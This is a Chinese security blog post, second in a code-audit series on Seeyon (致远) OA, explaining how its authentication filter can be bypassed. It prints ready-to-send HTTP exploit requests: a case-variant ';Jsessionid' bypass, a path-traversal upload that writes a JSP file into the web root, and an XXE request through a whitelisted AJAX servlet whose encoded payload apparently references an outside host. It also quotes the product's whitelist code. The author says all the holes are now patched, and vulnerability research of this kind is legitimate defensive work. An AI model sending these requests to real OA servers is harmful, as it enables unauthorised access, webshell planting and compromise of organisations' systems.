致远OA代码审计系列二
===========

原创 作者:archive 公号:安全回忆录 发布时间:2023-11-29 0:09 发表于北京

原文地址：[致远OA代码审计系列二](https://mp.weixin.qq.com/s/CRXxqaA2yRcRzdil1kyYAg)

**前言**  

上文简单介绍致远OA的审计环境的搭建以及OA的路由、权限校验的一些点, 本章节主要针对致远OA权限绕过进行一个分析总结. 结合致远OA历史漏洞进行分析讲解。

> 致远OA代码审计系列一
> 
> archive，公众号：安全回忆录[致远OA代码审计系列一](http://mp.weixin.qq.com/s?__biz=MzkyNjM1MDMyMg==&mid=2247483794&idx=1&sn=84af07a085a3b67efb46e9b09ea17018&chksm=c239ef0ff54e6619906b8ad3db6c26e1c2517356c80920493898cd472682b8da463bb4922757#rd)

《致远OA代码审计系列一》分析了致远OA的相关路由和权限认证模块, 本章节重点分享致远OA的相关权限绕过思路。

**权限绕过分析:**

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMsZW8N6TQoz4av7ibkU7OdibgxWoIKZJJQMc3EP9629Te0osP72MhJ8LBAyVTOJ6uzhvKibs7rRDxJPw/640?wx_fmt=png&from=appmsg)**

1.  **如何让认证器走到defaultAuthenticator.**
    

由于默认的defaultAuthenticator的authenticate仅进行了uri.startsWith()判断, 所以只要咱们访问的路径没在以上7个判断类型中, 进入到defaultAuthenticator即可通过致远OA的权限校验。

结合致远OA CTPSecurityFilter中的几个is判断. 不难看出想要进入defaultAuthenticator. 必须经过多个if判断。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMsZW8N6TQoz4av7ibkU7OdibgY6VI0wm6TtPrbq9eEp073RH0IaHuiaxMkU0pS59t0JVoGWGMF0Xyt1A/640?wx_fmt=png&from=appmsg)

直接先上绕过payload, 该绕过思路于2022年大HW前被官方修复, 由于官方补丁有进行加密. 网上一直没有相关漏洞信息. 所以该漏洞传播面没有那么广, 2022年HW和2023大HW该漏洞也还能都能遇到。

```http
GET /seeyon/organization/member.do;Jsessionid=??method=listByAccount&rescode=T02_memberList HTTP/1.1
Host: x.x.x.x:8890
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

由于8.1SP1对uri没有做大小写校验,直接通过Jsessionid大小写绕过了isSpringController的校验, 进入下一个if判断. 最终会走到defaultAuthenticator, 默认的认证器仅对uri进行了校验。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMsZW8N6TQoz4av7ibkU7Odibgno7rDQltJvicibHvRHRny4VNr0MbgEyA1x9OggIxiaQcMFbs92DNzzq0A/640?wx_fmt=png&from=appmsg)

至此就绕过了致远OA的权限校验模块,权限绕过后利用的漏洞以及利用手法在后面的文章会进行分析。

**2\. 认证器中的白名单利用:**

今年9月爆出的致远/rest/phoneLogin/phoneCode/resetPassword任意密码重置漏洞. 其走的认证器是restAuthenticator, 但是该接口在anonymousWhiteList中,所以可以通认证, 导致任意密码重置。这就是一个典型的认证器中白名单利用。  

```cs
static {
        sessionUserBlacklist.add(Pattern.compile(".*\\sorgMember.*"));
        sessionUserBlacklist.add(Pattern.compile(".*\\sorgAccount.*"));
        sessionUserBlacklist.add(Pattern.compile(".*\\sorgDepartment.*"));
        sessionUserBlacklist.add(Pattern.compile(".*\\sorgPost.*"));
        sessionUserBlacklist.add(Pattern.compile(".*\\sorgLevel.*"));
        sessionUserBlacklist.add(Pattern.compile(".*\\sexternalAccount.*"));
        sessionUserBlacklist.add(Pattern.compile(".*\\sorgPartTimeJob.*"));
        sessionUserBlacklist.add(Pattern.compile(".*\\sjoinOrgAccount.*"));
        sessionUserBlacklist.add(Pattern.compile(".*\\sjoinOrgDepartment.*"));
        sessionUserBlacklist.add(Pattern.compile(".*\\sjoinOrgPost.*"));
        sessionUserBlacklist.add(Pattern.compile(".*\\sjoinOrgMember.*"));
        sessionUserBlacklist.add(Pattern.compile(".*\\sjoinOrgRole.*"));
        sessionUserBlacklist.add(Pattern.compile(".*\\sjoinMetadataDepartment.*"));
        anonymousWhiteList = Arrays.asList("token", "application.wadl", "jssdk", "getRestCompare", "authentication", "cap4/form/pluginScripts", "orgMember/avatar", "orgMember/groupavatar", "m3/appManager/getAppList", "m3/appManager/download", "m3/message/unreadCount/", "m3/login/refresh", "m3/login/verification", "m3/theme/homeSkin", "m3/theme/homeSkinDownload", "m3/common/service/enabled", "uc/systemConfig", "product/hasPlugin", "product/dongle/data", "password/retrieve", "phoneLogin/phoneCode", "m3/appManager/checkEnv", "m3/security/device/apply", "meeting/meetingInviteCard", "microservice", "media/verify", "paperlessMeetingResource/device/save", "metrics", "ocip/forwardTo", "imc/orgInfo");
        guestWhiteList = Arrays.asList("webOffice/checkWebOfficeEnable", "webOffice/getBookMarkUpdateFlag", "supervision/bigScreen/column");
        visitorWhiteList = Arrays.asList("publicQrCode", "attachment", "commonImage", "m3/common/getConfigInfo", "meeting", "cmpNews", "doc");
    }
```

历史thirdpartycontroller.do导致的任意用户登陆, 由于当前V8.0SP1版本不存在该漏洞,根据网上分析判断. 该漏洞原因为thirdpartycontroller.do在白名单内, 最终会执行到session.setAttribute("com.seeyon.current\_user", currentUser), 产生了任意用户登陆漏洞, 进入后台后RCE。

**3. web.xml中的filter/servlet和CTPSecurityFilter中的差异**

利用web.xml中配置的filter和servlet进行绕过. 之前的文章提到过CTPSecurityFilter中的isServlet方法中servlets列表中的servlet列表远比web.xml中定义的少, 导致许多web.xml中配置的servlet可以直接访问. 进入defaultAuthenticator认证器。

wpsAssistServlet:

```http
POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/redt3am.jsp&fileId=2 HTTP/1.1
Host: 192.168.246.4
Content-Length: 349
Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
Accept-Encoding: gzip


--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name="upload"; filename="test.txt"
Content-Type: application/vnd.ms-excel


<% out.println("seeyon_vuln");%>
--59229605f98b8cf290a7b8908b34616b--
```

该Servlet就不在servlets列表中. 所以会进入最终的defaultAuthenticator认证器。  

```typescript
private static List<String> servlets = Arrays.asList("getAJAXMessageServlet", "getAJAXOnlineServlet", "htmlofficeservlet", "isignaturehtmlH5servlet", "isignaturehtmlservlet", "login/sso", "login/ssologout", "m-signature/", "ofdServlet", "office/cache/", "officeservlet", "pdfservlet", "sursenServlet", "verifyCodeImage.jpg");
```

  

4. **几个if判断语句是否存在绕过**

前段时间出的XXE攻击的S1服务组件Agent, 利用JDBC H2漏洞RCE. 其实就是利用了这个思路绕过。

```http
POST /seeyon/m-signature/RunSignature/run/getAjaxDataServlet?S=ajaxEdocSummaryManager&M=deleteUpdateObj HTTP/1.1
Host: 192.168.246.4
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
RequestType: AJAX
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 426


signdata=11&encode=true&imgvalue=YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh&elemid=111&xmlValue=PD94bWwgdmVyc2lvbj0iMS4wIj8%2bCjwhRE9DVFlQRSB0zXN0Wwo8IUVOVElUWSBmaWxlIFNzU1RFTSAiaHR0cDovLZExNi4xOTYuMTAxLjg4Ojc5NZkvYS50eHQiPgpdPgo8dXNlcj48dXNlcm5hbWU%2bJmzpbGU7PC91c2VybmFtzT48cGFZc3dvcmQ%2bMTwvcGFZc3dvcmQ%2bPC91c2VyPg%3d%3d
```

该url以getAjaxDataServlet结尾, 毫无疑问在isV3xAjax判断中返回true, 在V3xAjaxAuthenticator中之前提到. 只要在WHITE\_LIST中的ServiceName和methodName即可通过。

```javascript
private static final Set<String> WHITE_LIST = new HashSet(Arrays.asList("ajaxColManager_colDelLock", "ajaxEdocSummaryManager_deleteUpdateObj", "ajaxEdocManager_ajaxCheckNodeHasExchangeType", "ajaxEdocSummaryManager_deleteUpdateRecieveObj"));

```

S=ajaxEdocSummaryManager&M=deleteUpdateObj S和M参数在白名单里面,为白名单即可通过认证器的认证。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMsZW8N6TQoz4av7ibkU7OdibgtdicMneE4ib8SSTrTqEAkrRZxGT02VhtVbpSMwAh7gOq9p3fpjlMKWdw/640?wx_fmt=png&from=appmsg)

但是最终访问的路由并没有访问到AJAXDataServlet. 而是进入ActionServlet。ActionServlet会对uri通过/进行分割。 然后通过反射调用对应的action. 由于对class会自动添加action后缀。 只能反射访问action类。路由为/class/method/的形式. 具体的细节后续文章会进行分析。

为什么直接访问/m-signature/不行? 单独访问会进入isServlet判断, 且该判断会返回true, m-signature也不在isServlet的白名单列表当中。 所以这里利用了几个if的先后顺序, 优先进入了V3xAjaxAuthenticator认证器中. 而不会进入后续的isServlet判断.

```php
private static List servlets = Arrays.asList("getAJAXMessageServlet", "getAJAXOnlineServlet", "htmlofficeservlet", "isignaturehtmlH5servlet", "isignaturehtmlservlet", "login/sso", "login/ssologout", "m-signature/", "ofdServlet", "office/cache/", "officeservlet", "pdfservlet", "sursenServlet", "verifyCodeImage.jpg", "wpsServlet");
```

**总结:**

本文章总结了致远OA的一些权限绕过思路, 目前上述提到所有绕过方式官方均已经修复, 已发布漏洞补丁。后续文章将详细分析致远OA的相关历史漏洞。